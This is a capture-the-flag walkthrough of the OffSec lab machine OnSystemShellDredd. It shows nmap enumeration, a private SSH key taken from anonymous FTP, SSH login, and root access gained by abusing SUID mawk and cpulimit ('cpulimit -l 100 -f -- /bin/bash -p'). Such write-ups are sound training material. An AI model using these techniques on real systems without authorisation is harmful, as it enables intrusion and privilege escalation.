# OnSystemShellDredd

- [Machine information](#machine-information)
- [Solution](#solution)
- [References](#references)

## Machine information

```text
Type: PG Play
Difficulty: Fundamental
Community Rating: Easy
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
OS: Linux
Points: 5
Lab Description:
This lab challenges you to exploit an exposed FTP service to uncover a hidden SSH private key, 
granting initial access to the system. From there, privilege escalation is achieved by 
leveraging a misconfigured SUID binary, cpulimit, to execute arbitrary commands as root. 
Understanding SUID abuses and service enumeration techniques is key to completing this challenge. 
Ideal for penetration testers, red teamers, and security analysts seeking experience in FTP 
enumeration, SSH exploitation, and SUID privilege escalation.
Released: 23 Feb 2021
```

Machine link: [https://portal.offsec.com/machine/onsystemshelldredd-594/overview/details](https://portal.offsec.com/machine/onsystemshelldredd-594/overview/details)

## Solution

### Scan for services with nmap

We start by scanning the machine on all ports with `nmap` including service info and default scripts

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/OnSystemShellDredd]
└─$ export TARGET_IP=192.168.197.130

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/OnSystemShellDredd]
└─$ sudo nmap -sC -sV -p- $TARGET_IP
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-21 08:21 CET
Nmap scan report for 192.168.197.130
Host is up (0.033s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.201
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
61000/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 59:2d:21:0c:2f:af:9d:5a:7b:3e:a4:27:aa:37:89:08 (RSA)
|   256 59:26:da:44:3b:97:d2:30:b1:9b:9b:02:74:8b:87:58 (ECDSA)
|_  256 8e:ad:10:4f:e3:3e:65:28:40:cb:5b:bf:1d:24:7f:17 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.09 seconds
```

We have two services running:

- vsftpd 3.0.3 on port 21
- OpenSSH 7.9p1 on port 61000

### Enumerate the FTP server

Next, we check the contents of the FTP server

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/OnSystemShellDredd]
└─$ ftp anonymous@$TARGET_IP
Connected to 192.168.197.130.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||12154|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        115          4096 Aug 06  2020 .
drwxr-xr-x    3 0        115          4096 Aug 06  2020 ..
drwxr-xr-x    2 0        0            4096 Aug 06  2020 .hannah
226 Directory send OK.
ftp> cd .hannah
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||58818|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Aug 06  2020 .
drwxr-xr-x    3 0        115          4096 Aug 06  2020 ..
-rwxr-xr-x    1 0        0            1823 Aug 06  2020 id_rsa
226 Directory send OK.
ftp> mget id*
mget id_rsa [anpqy?]? y
229 Entering Extended Passive Mode (|||24790|)
150 Opening BINARY mode data connection for id_rsa (1823 bytes).
100% |****************************************************************************************************************************************************************|  1823      921.46 KiB/s    00:00 ETA
226 Transfer complete.
1823 bytes received in 00:00 (115.86 KiB/s)
ftp> quit
221 Goodbye.
```

We have a likely private SSH-key for the `hannah` user.

### Login with SSH as hannah

Let's try to use private key to login

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/OnSystemShellDredd]
└─$ chmod 600 id_rsa                                      

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/OnSystemShellDredd]
└─$ ssh -i id_rsa -p 61000 hannah@$TARGET_IP
The authenticity of host '[192.168.197.130]:61000 ([192.168.197.130]:61000)' can't be established.
ED25519 key fingerprint is SHA256:6tx3ODoidGvtQl+T9gJivu3xnndw7PXje1XLn+lZuSM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.197.130]:61000' (ED25519) to the list of known hosts.
Linux ShellDredd 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
hannah@ShellDredd:~$ id
uid=1000(hannah) gid=1000(hannah) groups=1000(hannah),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
hannah@ShellDredd:~$ 
```

We are in as `hannah`.

### Get the user flag

Now we can start looking for the user flag

```bash
hannah@ShellDredd:~$ pwd
/home/hannah
hannah@ShellDredd:~$ ls -la
total 32
drwxr-xr-x 3 hannah hannah 4096 Jan 29  2021 .
drwxr-xr-x 3 root   root   4096 Aug  6  2020 ..
lrwxrwxrwx 1 root   root      9 Jan 21  2021 .bash_history -> /dev/null
-rw-r--r-- 1 hannah hannah  220 Aug  6  2020 .bash_logout
-rw-r--r-- 1 hannah hannah 3526 Aug  6  2020 .bashrc
-rw-r--r-- 1 hannah hannah   33 Feb 21 08:20 local.txt
-rw-r--r-- 1 hannah hannah  807 Aug  6  2020 .profile
drwxr-xr-x 2 root   root   4096 Aug  6  2020 .ssh
-rw-r--r-- 1 hannah hannah   32 Jan 29  2021 user.txt
hannah@ShellDredd:~$ cat local.txt 
1<REDACTED>3
hannah@ShellDredd:~$ 
```

Nice, so far so good.

### Enumeration for privesc

We now enumerate the system for privilege escalation opportunities.

Checking for SUID/GUID-binaries, we find the following

```bash
hannah@ShellDredd:~$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -ls 2> /dev/null
      857     40 -rwxr-sr-x   1 root     shadow      39616 Feb 14  2019 /usr/sbin/unix_chkpwd
   136894     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
   134985     52 -rwsr-xr--   1 root     messagebus    51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   142390    428 -rwsr-xr-x   1 root     root         436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
     1481     36 -rwxr-sr-x   1 root     tty           34896 Jan 10  2019 /usr/bin/wall
       55     84 -rwsr-xr-x   1 root     root          84016 Jul 27  2018 /usr/bin/gpasswd
     3436     44 -rwsr-xr-x   1 root     root          44440 Jul 27  2018 /usr/bin/newgrp
     3910     36 -rwsr-xr-x   1 root     root          34888 Jan 10  2019 /usr/bin/umount
     2242    120 -rwsr-sr-x   1 root     root         121976 Mar 23  2012 /usr/bin/mawk
    13039    316 -rwxr-sr-x   1 root     ssh          321672 Jan 31  2020 /usr/bin/ssh-agent
     5515     44 -rwxr-sr-x   1 root     crontab       43568 Oct 11  2019 /usr/bin/crontab
       52     56 -rwsr-xr-x   1 root     root          54096 Jul 27  2018 /usr/bin/chfn
     3583     64 -rwsr-xr-x   1 root     root          63568 Jan 10  2019 /usr/bin/su
       51     72 -rwxr-sr-x   1 root     shadow        71816 Jul 27  2018 /usr/bin/chage
       54     32 -rwxr-sr-x   1 root     shadow        31000 Jul 27  2018 /usr/bin/expiry
       53     44 -rwsr-xr-x   1 root     root          44528 Jul 27  2018 /usr/bin/chsh
     5442     16 -rwxr-sr-x   1 root     tty           14736 May  4  2018 /usr/bin/bsd-write
    15771     36 -rwsr-xr-x   1 root     root          34896 Apr 22  2020 /usr/bin/fusermount
    15754     24 -rwsr-sr-x   1 root     root          23072 Jun 23  2017 /usr/bin/cpulimit
     3908     52 -rwsr-xr-x   1 root     root          51280 Jan 10  2019 /usr/bin/mount
       56     64 -rwsr-xr-x   1 root     root          63736 Jul 27  2018 /usr/bin/passwd
    12791     20 -rwxr-sr-x   1 root     mail          18944 Dec  3  2017 /usr/bin/dotlockfile
hannah@ShellDredd:~$ 
```

From the list [mawk](https://gtfobins.org/gtfobins/mawk/) or [cpulimit](https://gtfobins.org/gtfobins/cpulimit/) looks like a good choices.

### Get the root flag - alt #1

Finally, we get the root flag

```bash
hannah@ShellDredd:~$ mawk '//' /root/proof.txt
b<REDACTED>2
hannah@ShellDredd:~$ 
```

### Get the root flag - alt #2

Alternatively, we can get a root shell like this

```bash
hannah@ShellDredd:~$ cpulimit -l 100 -f -- /bin/bash -p
Process 1029 detected
bash-5.0# id
uid=1000(hannah) gid=1000(hannah) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),1000(hannah)
bash-5.0# cat /root/proof.txt
b<REDACTED>3
bash-5.0# 
```

For additional information, please see the references below.

## References

- [cpulimit - GTFOBins](https://gtfobins.org/gtfobins/cpulimit/)
- [File Transfer Protocol - Wikipedia](https://en.wikipedia.org/wiki/File_Transfer_Protocol)
- [find - Linux manual page](https://man7.org/linux/man-pages/man1/find.1.html)
- [ftp - Linux manual page](https://linux.die.net/man/1/ftp)
- [id - Linux manual page](https://man7.org/linux/man-pages/man1/id.1.html)
- [mawk - GTFOBins](https://gtfobins.org/gtfobins/mawk/)
- [nmap - Homepage](https://nmap.org/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [nmap - Manual page](https://nmap.org/book/man.html)
- [OpenSSH - Wikipedia](https://en.wikipedia.org/wiki/OpenSSH)
- [Secure Shell - Wikipedia](https://en.wikipedia.org/wiki/Secure_Shell)
- [Setuid - Wikipedia](https://en.wikipedia.org/wiki/Setuid)
- [ssh - Linux manual page](https://man7.org/linux/man-pages/man1/ssh.1.html)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
- [vsftpd - Wikipedia](https://en.wikipedia.org/wiki/Vsftpd)
